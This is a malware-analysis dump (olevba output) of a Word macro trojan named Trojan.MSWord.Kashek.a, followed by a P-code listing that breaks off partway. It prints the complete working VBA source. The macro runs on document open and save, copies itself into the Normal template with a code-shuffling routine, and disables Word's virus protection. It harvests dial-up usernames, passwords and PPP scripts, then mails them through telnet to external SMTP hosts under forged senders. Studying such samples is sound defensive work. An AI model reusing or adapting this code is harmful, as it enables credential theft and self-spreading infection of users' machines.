olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Kashek.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Kashek.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPluss_SCP.bas 
in file: Trojan.MSWord.Kashek.a - OLE stream: 'Macros/VBA/MSPluss_SCP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Dial-up_script_and_password_checker
Option Explicit
Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type
Type RASENTRYNAME
dwSize As Long
szEntryName(256) As Byte
End Type
Type RASDIALPARAMS
     dwSize As Long
     szEntryName(256) As Byte
     szPhoneNumber(128) As Byte
     szCallbackNumber(128) As Byte
     szUserName(256) As Byte
     szPassword(256) As Byte
     szDomain(15) As Byte
End Type
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As Any, ByVal lpWindowName As Any) As Long
Declare Function RasEnumEntries Lib "RasApi32.DLL" Alias "RasEnumEntriesA" (ByVal reserved$, ByVal lpszPhonebook$, lprasentryname As RASENTRYNAME, lpcb As Long, lpcEntries As Long) As Long
Declare Function RasGetEntryDialParams Lib "rasapi32" Alias "RasGetEntryDialParamsA" (ByVal lpszPhonebook As String, lpRasDialParams As RASDIALPARAMS, lpfPassword As Byte) As Long
'
Function Check_Connection()
Dim CurrWnd As Long
Dim Length As Long
Dim Title As String
  On Error Resume Next
  CurrWnd = FindWindow(CLng(0), "")
  CurrWnd = GetWindow(CurrWnd, 0)
    Do While CurrWnd <> 0
       Length = GetWindowTextLength(CurrWnd)
        Title = Space(Length + 1)
    Length = GetWindowText(CurrWnd, Title, Length + 1)
    If InStr(1, Title, "Connected to", vbTextCompare) <> 0 _
     Or InStr(1, Title, "Ïîäêëþ÷åíî ê", vbTextCompare) <> 0 Then
     Check_Connection = True
     Exit Function
    End If
    CurrWnd = GetWindow(CurrWnd, 2)
    DoEvents
  Loop
  Check_Connection = False
End Function
' End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Sender_main
End Sub

Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub

Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open WinDir + "logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub

Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub
Sub CopyLines(Source As Object)
On Error Resume Next
     Dim SourceM As Object, TargetM As Object
     Dim n As Long
     Dim Body As String
     Dim VBComponent  As Object
    For Each VBComponent In Source.VBProject.VBComponents
     Set SourceM = VBComponent
     n = SourceM.CodeModule.CountOfLines
     Body = SourceM.CodeModule.Lines(1, 1)
     If InStr(1, Body, "Dial-up_script_and_password_checker", vbTextCompare) <> 0 Then
     Body = SourceM.CodeModule.Lines(1, n)
     Body = morf(Body)
     Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
     TargetM.CodeModule.AddFromString Body
     TargetM.Name = "MSPluss_SCP"
     End If
   Next
End Sub

Sub FileOpen()
On Error Resume Next
AutoOpen
Dialogs(80).Show
Sender_main
End Sub
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Randomize
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next
End Function
' End Sub
Function Conn_()
Dim PAR(255) As RASENTRYNAME
Dim Counter As Long
Dim S As Long
Dim ConName$
Dim username$
Dim i As Integer
Dim res As Long
Dim MStr
Dim j As Integer
Dim PARAM As RASDIALPARAMS
Dim PWDdet As Byte
Dim n As Integer
Dim z As Long
Dim PWD As String, UsName As String
Dim Resalt As String
On Error Resume Next
PAR(0).dwSize = 264
S = 256 * PAR(0).dwSize
res = RasEnumEntries(1, 1, PAR(0), S, Counter)
For i = 0 To Counter - 1
For j = 0 To 256
ConName = ConName + Chr(PAR(i).szEntryName(j))
Next
ConName = Left$(ConName, InStr(ConName, vbNullChar) - 1)

For n = 0 To 256
PARAM.szEntryName(n) = PAR(i).szEntryName(n)
Next
PARAM.dwSize = 1052
res = RasGetEntryDialParams(1, PARAM, PWDdet)
For z = 0 To 256
UsName = UsName + Chr(PARAM.szUserName(z))
PWD = PWD + Chr(PARAM.szPassword(z))
Next
UsName = Left$(UsName, InStr(UsName, vbNullChar) - 1)
PWD = Left$(PWD, InStr(PWD, vbNullChar) - 1)
Resalt = Resalt + "Connection: " + ConName + Chr(13) + "User: " + UsName + Chr(13) + "Password: " + PWD + Chr(10) + Chr(13)
PWD = "": UsName = "": ConName = ""
DoEvents
Next
Conn_ = Resalt
End Function
' End Sub
Sub AutoExit()
Dim Counter As Integer
Dim i As Integer
Dim VBComp As Object
Dim Body As String

 Application.Visible = False
 Options.SaveNormalPrompt = False
 On Error Resume Next

Counter = Templates.Count
For i = 1 To Counter
 For Each VBComp In Templates(i).VBProject.VBComponents
  Body = VBComp.CodeModule.Lines(1, 1)
  If InStr(1, Body, "Dial-up_script_and_password_checker", vbTextCompare) = 0 Then
     With VBComp.CodeModule
       .DeleteLines 1, .CountOfLines
     End With
   If VBComp.Name <> "ThisDocument" Then
   Application.OrganizerDelete Templates(i).Name, VBComp.Name, wdOrganizerObjectProjectItems
   End If
 End If
 Next
Next i
 NormalTemplate.Save
 Tmsn
 Options.VirusProtection = True
End Sub

Sub Sender_main()
Dim Handle As Long
Dim HandleBW As Long
Dim NoConn_ As String
Dim hwnd As Long
Dim GrabStr As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 14) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim Twnd As String
Dim None As String
Dim RecipientOfMessage_ As String
Dim SenderAddress As String
Dim SenderDomain As String
Dim UsName
Dim Domain_ As String
Dim Char_ As Byte
Dim z As Integer

On Error Resume Next
If Check_Connection = True Then
RecipientOfMessage_ = "<kashek@usa.net>"
Host(1) = "smtp.mail.ru": Domain_ = "@mail.ru"
UsName = Array("-dima-", "2vasiliy", "521521", "DGabidullin", "Intarsija", "KirovDVP", "Mischelli", "MonitorExpress", "Sveta-P2000", "Voronin_Vladimir", "a_kladenova", "abccondi", "abs", "admiralll", "ako", "alazif", "alcan777", "aleksiv2000", "alena_elena", "alexander555", "alexkis", "alexsar", "alltair", "alt-info", "antares_", "anton76", "artyserg", "arxi77", "asp", "ate", "avatchev", "axel_extr", "balds", "bars-profile", "batsek", "best-njl", "bigmoney4u", "bkp", "braut_99", "broker-nsk", "bxk", "c_service", "carlych", "ciap", "courses", "darlenka", "daswer", "datasave")
Host(2) = "itk2.bas-net.by"
Host(3) = "195.75.32.20"

Loto 3, A()
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
                                                 
  If THwnd <> 0 Then
    Twnd = "telnet"
    None = "(none)"
    NoConn_ = "Connect failed"
  Else
   THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
   If THwnd <> 0 Then
    Twnd = "Òåëíåò"
    None = "(íåò)"
    NoConn_ = "Ñáîé ïîäêëþ÷åíèÿ"
   Else
   THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
    Twnd = "telnet"
    None = "(íåò)"
    NoConn_ = "Ñáîé ïîäêëþ÷åíèÿ"
   End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
DoEvents
For f = 1 To 3
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), NoConn_)
 DoEvents
Loop
Select Case Handle
  Case Is <> 0

Randomize
SenderDomain = UsName(Int(UBound(UsName) * Rnd))
SenderAddress = UsName(Int(UBound(UsName) * Rnd)) + Domain_

SMTP = "helo My" + SenderDomain + "#$$mail from: <" + SenderAddress + ">#$" + "rcpt to: " + RecipientOfMessage_ + "#$data#$" + _
 "From: <" + SenderAddress + ">#" + "To: " + RecipientOfMessage_ + "#" + _
 "Date: " + Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#" + _
 "Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: 7bit##"
Filler SMTP, Handle
Pause 1
GrabStr = Grab + SCP + "##.#quit#"
Filler GrabStr, Handle
Pause 1
 Start = Timer
Do Until hwnd <> 0 Or Timer - Start > 120
 hwnd = FindWindow(CLng(0), Twnd)
 DoEvents
Loop
Select Case hwnd
Case Is = 0
            
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hwnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open WinDir + "logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), Twnd + " - " + None)
SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
Pause 3
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Pause 3
HandleBW = 0
Handle = 0
End Select
Next
End If
End Sub
Sub Filler(MessStr As String, hwnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hwnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
    If i Mod 380 = 0 Then
    Pause 1
    End If
   Charset = SendMessage(hwnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub
Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Function SCP()
Dim res As Long
Dim res1 As Long
Dim Resalt As String
Dim hkey As Long
Dim hkey1 As Long
Dim i As Long
Dim KeyName As String
Dim KeyLen As Long
Dim ClassName As String
Dim ClassLen As Long
Dim lastwrite As FILETIME
Dim user As String, PPPScript As String
Dim NF As Long
Dim Tmp As String
On Error Resume Next
res = RegOpenKeyEx(&H80000001, "RemoteAccess\Profile\", 0, &H8, hkey)
If res <> 0 Then
Resalt = "Can not read entry from R."
SCP = Resalt
Exit Function
End If
i = 0
Do While res = 0
 KeyName = Space(255): ClassName = Space(255)
 KeyLen = 255: ClassLen = 255
res = RegEnumKeyEx(hkey, i, KeyName, KeyLen, ByVal 0, ClassName, ClassLen, lastwrite)
If res = 0 Then
 KeyName = Left(KeyName, KeyLen)
 ClassName = Left(ClassName, ClassLen)
 res1 = RegOpenKeyEx(&H80000001, "RemoteAccess\Profile\" + KeyName, 0, &H8, hkey1)
If res1 = 0 Then
user = System.PrivateProfileString("", "HKEY_CURRENT_USER\RemoteAccess\Profile\" + KeyName, "user")
PPPScript = System.PrivateProfileString("", "HKEY_CURRENT_USER\RemoteAccess\Profile\" + KeyName, "PPPScript")
res1 = RegCloseKey(hkey1)
If PPPScript <> "" Then
 NF = FreeFile
 On Error GoTo aaa
 Open PPPScript For Input Access Read As NF
    If LOF(NF) < 7000 Then
      Do While Not EOF(NF)
       Line Input #NF, Tmp
       PPPScript = PPPScript + Chr(13) + Chr(10) + Tmp
      Loop
    Else
      PPPScript = PPPScript + Chr(13) + Chr(10) + "Ôàéë > 7 kB."
    End If
 Close NF
aaa:
On Error Resume Next
End If
Resalt = Resalt + "Connection " + KeyName + " - " + Chr(13) + Chr(10) + "user: " + user + Chr(13) + Chr(10) + "PPPScript:" + PPPScript + Chr(13) + Chr(10)
Else
Resalt = Resalt + "Can not open the key " + KeyName + Chr(13) + Chr(10)
End If
i = i + 1
End If
Loop
res = RegCloseKey(hkey)
Resalt = "There are " + Str(i) + " Dial-up connections." + Chr(13) + Chr(10) + Resalt
SCP = Resalt
End Function
' End Sub
Sub AutoOpen()
Dim VBComponent As Object
Dim Yes As Boolean
Dim Body As String
 On Error Resume Next
 Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 Body = VBComponent.CodeModule.Lines(1, 1)
   If InStr(1, Body, "Dial-up_script_and_password_checker", vbTextCompare) <> 0 Then
     Yes = True
     Exit For
   End If
 Next
If Yes = False Then
CopyLines MacroContainer
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
NormalTemplate.Save
End Sub
Function Grab()
Dim Tmp As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
On Error Resume Next
If Dir$(WinDir + "edialer.ini") <> "" Then
NF = FreeFile
Open WinDir + "edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Temp = Temp + Tmp + Chr(10)
  End If
Loop
Close #NF
Temp = Temp + Chr(10) + Chr(13) + Conn_()
End If
Grab = Temp
End Function
' End Sub
' End Sub

Sub AutoClose()
On Error Resume Next
AutoOpen
End Sub
Sub Sender()
Dim i As Long
 i = 0
 For i = 0 To 4
  If Check_Connection = True Then
   Sender_main
   Exit Sub
  Else
   Pause 254
  End If
 Next
End Sub
Function morf(MyString As String)
Dim NextSub As Long
Dim Counter As Integer
Dim A() As Integer
Dim Code_() As String
Dim i As Long
Dim Pre_ As Long
Dim Resalt As String
On Error Resume Next
NextSub = InStr(1, MyString, "End" + " Sub", vbTextCompare)
Do While NextSub <> 0
Counter = Counter + 1
NextSub = InStr(NextSub + 9, MyString, "End" + " Sub", vbTextCompare)
Loop
ReDim Code_(0 To Counter - 1)

NextSub = -8
For i = 0 To Counter - 1
Pre_ = NextSub + 9
NextSub = InStr(Pre_, MyString, "End" + " Sub", vbTextCompare)
Code_(i) = Mid(MyString, Pre_, NextSub + 9 - Pre_)
Next i
Loto Counter - 1, A()
Resalt = Code_(0)
For i = 1 To Counter - 1
Resalt = Resalt + Code_(A(i))
Next i
morf = Resalt
End Function
' End Sub
Function WinDir()
Dim res As Long
Dim DirWin As String

DirWin = Space(255)
res = GetWindowsDirectory(DirWin, 255)
DirWin = Left(DirWin, res)
WinDir = DirWin + "\"
End Function
' End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Trojan.MSWord.Kashek.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1336 bytes
' Macros/VBA/MSPluss_SCP - 38696 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0023 "Dial-up_script_and_password_checker"
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Type FILETIME
' Line #3:
' 	DimImplicit 
' 	VarDefn dwLowDateTime (As Long)
' Line #4:
' 	DimImplicit 
' 	VarDefn dwHighDateTime (As Long)
' Line #5:
' 	EndType 
' Line #6:
' 	Type RASENTRYNAME
' Line #7:
' 	DimImplicit 
' 	VarDefn dwSize (As Long)
' Line #8:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0100 
' 	VarDefn szEntryName (As Byte)
' Line #9:
' 	EndType 
' Line #10:
' 	Type RASDIALPARAMS
' Line #11:
' 	DimImplicit 
' 	VarDefn dwSize (As Long)
' Line #12:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0100 
' 	VarDefn szEntryName (As Byte)
' Line #13:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0080 
' 	VarDefn szPhoneNumber (As Byte)
' Line #14:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0080 
' 	VarDefn szCallbackNumber (As Byte)
' Line #15:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0100 
' 	VarDefn szUserName (As Byte)
' Line #16:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0100 
' 	VarDefn szPassword (As Byte)
' Line #17:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x000F 
' 	VarDefn szDomain (As Byte)
' Line #18:
' 	EndType 
' Line #19:
' 	FuncDefn (Declare Function RegOpenKeyEx Lib "advapi32.dll" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #20:
' 	FuncDefn (Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long)
' Line #21:
' 	FuncDefn (Declare Function RegEnumKeyEx Lib "advapi32.dll" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As ) As Long)
' Line #22:
' 	FuncDefn (Declare Function GetWindowsDirectory Lib "kernel32.dll" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #23:
' 	FuncDefn (Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long)
' Line #24:
' 	FuncDefn (Declare Function GetWindowText Lib "user32" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long)
' Line #25:
' 	FuncDefn (Declare Function GetWindowTextLength Lib "user32" (ByVal hwnd As Long) As Long)
' Line #26:
' 	FuncDefn (Declare Function SendMessage Lib "user32.dll" (ByVal hwnd As Long, ByVal Msg As Long, wParam As , lParam As ) As Long)
' Line #27:
' 	FuncDefn (Declare Function FindWindow Lib "user32.dll" (ByVal lpClassName As , ByVal lpWindowName As ) As Long)
' Line #28:
' 	FuncDefn (Declare Function RasEnumEntries Lib "RasApi32.DLL" (ByVal reserved, ByVal lpszPhonebook, lprasentryname As , lpcb As Long, lpcEntries As Long) As Long)
' Line #29:
' 	FuncDefn (Declare Function RasGetEntryDialParams Lib "rasapi32" (ByVal lpszPhonebook As String, lpRasDialParams As , lpfPassword As Byte) As Long)
' Line #30:
' 	QuoteRem 0x0000 0x0000 ""
' Line #31:
' 	FuncDefn (Function Check_Connection())
' Line #32:
' 	Dim 
' 	VarDefn CurrWnd (As Long)
' Line #33:
' 	Dim 
' 	VarDefn Length (As Long)
' Line #34:
' 	Dim 
' 	VarDefn Title (As String)
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x0000 ""
' 	ArgsLd FindWindow 0x0002 
' 	St CurrWnd 
' Line #37:
' 	Ld CurrWnd 
' 	LitDI2 0x0000 
' 	ArgsLd GetWindow 0x0002 
' 	St CurrWnd 
' Line #38:
' 	Ld CurrWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #39:
' 	Ld CurrWnd 
' 	ArgsLd GetWindowTextLength 0x0001 
' 	St Length 
' Line #40:
' 	Ld Length 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Space 0x0001 
' 	St Title 
' Line #41:
' 	Ld CurrWnd 
' 	Ld Title 
' 	Ld Length 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd GetWindowText 0x0003 
' 	St Length 
' Line #42:
' 	LineCont 0x0004 0D 00 05 00
' 	LitDI2 0x0001 
' 	Ld Title 
' 	LitStr 0x000C "Connected to"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Title 
' 	LitStr 0x000C "Ïîäêëþ÷åíî ê"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #43:
' 	LitVarSpecial (True)
' 	St Check_Connection 
' Line #44:
' 	ExitFunc 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld CurrWnd 
' 	LitDI2 0x0002 
' 	ArgsLd GetWindow 0x0002 
' 	St CurrWnd 
' Line #47:
' 	ArgsCall DoEvents 0x0000 
' Line #48:
' 	Loop 
' Line #49:
' 	LitVarSpecial (False)
' 	St Check_Connection 
' Line #50:
' 	EndFunc 
' Line #51:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #52:
' Line #53:
' 	FuncDefn (Sub FileSave())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	ArgsCall Sender_main 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Sub FileClose())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	ArgsCall AutoOpen 0x0000 
' Line #62:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub Tmsn())
' Line #66:
' 	Dim 
' 	VarDefn Delta (As Integer)
' Line #67:
' 	Dim 
' 	VarDefn Old (As Byte)
' Line #68:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #69:
' 	Ld Friend 
' 	St NF 
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	Ld WinDir 
' 	LitStr 0x0009 "logow.sys"
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #72:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld Old 
' 	GetRec 
' Line #73:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #74:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St Delta 
' Line #75:
' 	Ld Delta 
' 	Ld Old 
' 	Sub 
' 	St Delta 
' Line #76:
' 	Ld Delta 
' 	SelectCase 
' Line #77:
' 	LitDI2 0x0002 
' 	CaseGt 
' 	CaseDone 
' Line #78:
' 	ArgsCall Sender 0x0000 
' Line #79:
' 	LitDI2 0x0000 
' 	Ld Delta 
' 	LitDI2 0x001F 
' 	Add 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	CaseLt 
' 	CaseDone 
' Line #80:
' 	ArgsCall Sender 0x0000 
' Line #81:
' 	CaseElse 
' Line #82:
' 	EndSelect 
' Line #83:
' 	EndSub 
' Line #84:
' Line #85:
' 	FuncDefn (Sub ToolsOptions())
' Line #86:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #87:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #88:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #89:
' 	EndWith 
' Line #90:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #91:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #92:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #93:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #94:
' 	EndWith 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub CopyLines(Source As Object))
' Line #97:
' 	OnError (Resume Next) 
' Line #98:
' 	Dim 
' 	VarDefn SourceM (As Object)
' 	VarDefn TargetM (As Object)
' Line #99:
' 	Dim 
' 	VarDefn n (As Long)
' Line #100:
' 	Dim 
' 	VarDefn Body (As String)
' Line #101:
' 	Dim 
' 	VarDefn VBComponent (As Object) 0x0016
' Line #102:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld Source 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #103:
' 	SetStmt 
' 	Ld VBComponent 
' 	Set SourceM 
' Line #104:
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St n 
' Line #105:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #106:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0023 "Dial-up_script_and_password_checker"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #107:
' 	LitDI2 0x0001 
' 	Ld n 
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #108:
' 	Ld Body 
' 	ArgsLd morf 0x0001 
' 	St Body 
' Line #109:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set TargetM 
' Line #110:
' 	Ld Body 
' 	Ld TargetM 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #111:
' 	LitStr 0x000B "MSPluss_SCP"
' 	Ld TargetM 
' 	MemSt New 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	StartForVariable 
' 	Next 
' Line #114:
' 	EndSub 
' Line #115:
' Line #116:
' 	FuncDefn (Sub FileOpen())
' Line #117:
' 	OnError (Resume Next) 
' Line #118:
' 	ArgsCall AutoOpen 0x0000 
' Line #119:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #120:
' 	ArgsCall Sender_main 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Function Loto(i As Integer, A As ))
' Line #123:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #124:
' 	LitDI2 0x0001 
' 	Ld i 
' 	RedimAs A 0x0001 (As Integer)
' Line #125:
' 	Dim 
' 	VarDefn Tmp (As Integer)
' Line #126:
' 	Dim 
' 	VarDefn Temp (As Integer)
' Line #127:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #128:
' 	Ld n 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #129:
' 	StartForVariable 
' 	Next 
' Line #130:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #131:
' 	ArgsCall Read 0x0000 
' Line #132:
' 	Ld i 
' 	Ld n 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld n 
' 	Add 
' 	FnInt 
' 	St Tmp 
' Line #133:
' 	Ld n 
' 	ArgsLd A 0x0001 
' 	St Temp 
' Line #134:
' 	Ld Tmp 
' 	ArgsLd A 0x0001 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #135:
' 	Ld Temp 
' 	Ld Tmp 
' 	ArgsSt A 0x0001 
' Line #136:
' 	StartForVariable 
' 	Next 
' Line #137:
' 	EndFunc 
' Line #138:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #139:
' 	FuncDefn (Function Conn_())
' Line #140:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn PAR (As type_00000DE8)
' Line #141:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #142:
' 	Dim 
' 	VarDefn S (As Long)
' Line #143:
' 	Dim 
' 	VarDefn ConName
' Line #144:
' 	Dim 
' 	VarDefn username
' Line #145:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #146:
' 	Dim 
' 	VarDefn res (As Long)
' Line #147:
' 	Dim 
' 	VarDefn MStr
' Line #148:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #149:
' 	Dim 
' 	VarDefn PARAM (As RASDIALPARAMS)
' Line #150:
